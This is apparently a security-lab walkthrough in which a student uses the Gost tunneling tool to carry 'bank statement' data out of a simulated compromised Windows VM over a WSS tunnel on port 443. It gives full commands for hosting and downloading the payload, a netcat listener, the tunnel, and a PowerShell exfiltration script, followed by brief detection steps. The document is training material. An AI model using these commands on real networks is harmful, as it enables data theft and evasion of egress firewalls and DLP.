![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

# Gost

# Ubuntu & Windows VM

## The objective of this lab is to use Gost to establish an encrypted WebSocket (WSS) tunnel over port 443, bypassing simulated egress firewall rules to exfiltrate sensitive data. You will also learn how to detect this type of anomalous connection.
---
### Documentation and scenario : 

**What is Gost?**

Gost (GO Simple Tunnel) is a legitimate, open-source network tunneling and proxy tool written in the Go programming language. It is designed to help network administrators and users route traffic securely, bypass network restrictions, and manage complex routing scenarios.


**Core Capabilities of Gost** :

   - *Multi-Protocol Support* :  It supports a wide array of proxy and tunneling protocols, including HTTP, HTTPS, SOCKS4, SOCKS5, Shadowsocks, SSH, QUIC, and gRPC.

   - *Proxy Chaining* :  Gost can chain multiple proxies together (e.g., routing traffic through Proxy A, then Proxy B, then to the destination), which can obscure the origin of the traffic.

   - *Port Forwarding* :  It supports both local and remote (reverse) port forwarding for TCP and UDP traffic.

   - *Encryption and Encapsulation* :  Gost can encapsulate standard traffic inside encrypted protocols like TLS, HTTPS, or QUIC. This allows the traffic to blend in with normal web browsing.

If you want to dive a bit deeper, check the [Gost Documentation](https://github.com/ginuerzh/gost)

>[!NOTE]
>In the cybersecurity landscape, tools like Gost are known as "dual-use" tools. While designed for legitimate administration, **attackers frequently drop them onto compromised machines (like a breached Windows 11 endpoint) to facilitate post-exploitation activities**.
>This technique is similar to **"Living off the Land"**, where attackers use existing or legitimate administrative tools to evade detection by antivirus software. 


**This exact scenario is what we are going to simulate.** 

### **SCENARIO** : 

 - In this lab, we are simulating an advanced data exfiltration attack using cloud infrastructure. *The Ubuntu VM acts as the attacker's "Cloud VPS"* (representing a server hosted on AWS, Azure, or DigitalOcean), while *the Windows VM represents a compromised machine within a corporate network*.

 - To successfully steal sensitive data without triggering the company's Egress Firewalls or Data Loss Prevention (DLP) systems, **we will use Gost to establish a WebSocket Secure (WSS) tunnel over port 443**.

 - **Why are we doing this?** By routing our exfiltration through WSS on port 443, the stolen data is encrypted and blends in perfectly with normal network traffic. To the firewall, it simply looks like a user browsing a legitimate HTTPS cloud service, allowing the data to slip past defenses completely unnoticed.

>[!IMPORTANT]
> **You** will start on the Windows VM, but you should think of all the commands that we type into the **Ubuntu Shell** as commands typed by the hacker on a totally different system. All tools and sensitive data meant to be exfiltrated are located in the **Lab Directory**.

---

### Phase 1 : Setup and Objective

We have access to a compromised *Windows 11* System, and we would like to exfiltrate a *"sensitive"* file containing bank statements. We will do that using **Gost**.

- First things first, open Windows Powershell and navigate to the **Lab Directory** :

```bash 
cd Desktop/Labs/GostLab
```

<img width="1394" height="872" alt="image" src="https://github.com/user-attachments/assets/fd0b1603-cf87-4faf-8cbb-33a9b980626c" />

- Let's take a look at the **financial_records.csv** file. This is what we are going to use **Gost** to exfiltrate to the *"Cloud VPS"* (here represented by the *Ubuntu VM*):
  
<img width="935" height="368" alt="image" src="https://github.com/user-attachments/assets/a0ad73bb-99f1-4f03-9731-0716c36bffd0" />

- Type **"clear"** in the terminal and *resize* it such that it takes up less space.

---

### Phase 2: Staging the Attack 

As an attacker, you already have your tools pre-staged on your server. We need to set up a delivery method for our Windows payload, a listener to catch the stolen data, and the Gost tunnel exit point.

- First up, open up an **Ubuntu Shell** terminal:
  
  <img width="1843" height="797" alt="image" src="https://github.com/user-attachments/assets/3bb51f48-4d11-4287-81cf-ffbca6ec033a" />


>[!IMPORTANT]
> We will use **3 Ubuntu Terminals**, which may take up a lot of space on your screens. You should *resize* the different terminals, such that they take up as little space as possible.  


- *Terminal 1:* - In the terminal you just opened, move to the **Lab Directory** and start a quick Python web server to host the Windows payload (gost.exe) so the victim machine can download it. Minimize it afterwards:

```bash
cd ~/BnB/GostLab
python3 -m http.server 8001
```

<img width="1118" height="691" alt="image" src="https://github.com/user-attachments/assets/78374cf9-3aaa-4417-80d3-35a8124def32" />


- *Terminal 2:* Open up another *Ubuntu Shell*, move to the **Lab Directory** and start a Netcat listener on port 8080. This is the final destination that will save the incoming stolen data to a file. **You should not minimize this one**.

```bash
cd ~/BnB/GostLab
nc -lvnp 8080 > exfiltrated_data.csv
```

<img width="569" height="92" alt="image" src="https://github.com/user-attachments/assets/258f9049-1472-4ca9-b1a4-ffa0598a9ae4" />


- *Terminal 3:* Open up another *Ubuntu Shell*, navigate to the **Lab Directory** and start Gost to listen on port 443 (simulating standard HTTPS traffic) and forward that traffic internally to our Netcat listener. **(Note down your Ubuntu VM IP address before running this, you will need it later)**. Minimize this window too.


```bash
cd ~/BnB/GostLab
ls -lh
sudo ./gost -L wss://:443
```

<img width="1319" height="630" alt="image" src="https://github.com/user-attachments/assets/81af4195-3790-4b9f-a5dc-95e98a492a3f" />


<br></br>

>[!NOTE]
>Copy your **<UBUNTU_IP>**, you will need it to know where to exfiltrate the data to. 

---

### Phase 3: Payload Delivery & Exfiltration
Now we switch to the compromised Windows machine. We need to download the tunneling tool (Living off the Land) and extract the sensitive data.

- Download the Gost payload directly from our Ubuntu server into a temporary folder. **Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address.**

```powershell
Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8001/gost.exe" -OutFile "$env:TEMP\gost.exe"
```

<img width="908" height="561" alt="image" src="https://github.com/user-attachments/assets/ea6627b9-d52d-43ff-83fb-75c925f403cb" />

- In the same terminal, start the Gost tunnel entry point. This opens a local port (9000) and encapsulates everything we send to it into an encrypted WebSocket (WSS) stream directed at our Ubuntu server.

```powershell
& "$env:TEMP\gost.exe" -L tcp://:9000/127.0.0.1:8080 -F wss://<UBUNTU_IP>:443
```
<img width="1199" height="96" alt="image" src="https://github.com/user-attachments/assets/244e1e26-f48c-49db-8ff8-1488fa032e30" />

<br></br>

>[!IMPORTANT]
> **Do NOT close this terminal until the end of the lab**. We'll use it in the **Blue Team Detection** segment. 

<br></br>

- Open a *NEW* PowerShell terminal. We will now push the sensitive financial records straight into the local end of the tunnel. 

```powershell
$client = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9000)
$stream = $client.GetStream()
$content = Get-Content -Raw C:\Users\Administrator\Desktop\Labs\GostLab\financial_records.csv
$bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
Write-Host "Exfil Complete!" -ForegroundColor Green
```

You will now see a **Connection recieved** message in the Ubuntu Terminal.

<img width="805" height="307" alt="image" src="https://github.com/user-attachments/assets/a0045e4b-f4f0-48f5-9ab0-345d24c91110" />


---

### Phase 4: Verification
Let's see if the firewall was bypassed successfully.

- Go back to your Ubuntu VM, specifically to *Terminal 2* (where Netcat was running). The listener should automatically stop once the information is recieved. When it does, read the stolen data.

```bash
cat exfiltrated_data.csv
```
<img width="849" height="143" alt="image" src="https://github.com/user-attachments/assets/d2666a18-f713-440a-b03c-651013dc0f07" />

---

### Phase 5: Blue Team Detection

Why didn't the enterprise firewall block this? Because the traffic looked like a normal encrypted web connection (HTTPS/443). How can we detect it as defenders?

Open a NEW PowerShell terminal as Administrator. We will perform a Live Response on the machine to find the hidden tunnel.

- Find anomalous network connections.
Instead of standard netstat, we will use PowerShell cmdlets to specifically look for established external connections on port 443.


```PowerShell
Get-NetTCPConnection -RemotePort 443 -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess
```

[Screenshot: Output-ul comenzii, arătând clar IP-ul de Ubuntu la RemoteAddress, portul 443 și numărul OwningProcess (PID)]

- Identify the process owning the connection: Take the OwningProcess ID (PID) from the previous command and let's see what program is actually communicating with the outside world. (Replace <PID> with your specific number).

```PowerShell
Get-Process -Id <PID> | Select-Object Name, Path, Description
```
[Screenshot: Output-ul arătând Name: "gost", Path: "C:\Users\Administrator\AppData\Local\Temp\gost.exe"]


